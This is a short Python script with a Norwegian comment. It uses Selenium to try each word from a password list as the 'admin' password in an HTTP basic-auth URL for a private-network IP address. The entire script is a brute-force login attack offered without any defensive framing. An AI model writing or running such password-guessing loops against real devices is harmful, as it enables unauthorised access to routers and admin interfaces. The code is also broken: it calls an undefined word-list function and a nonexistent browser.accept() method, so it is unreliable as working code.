from selenium import webdriver
browser = webdriver.Firefox() #Åpner nettleser vindu
passwordlist = hentOrd()
for ord in passwordlist:
    browser.get('http://admin:' + ord + '@10.220.50.161')
    alert = browser.switch_to_alert()
    browser.accept()
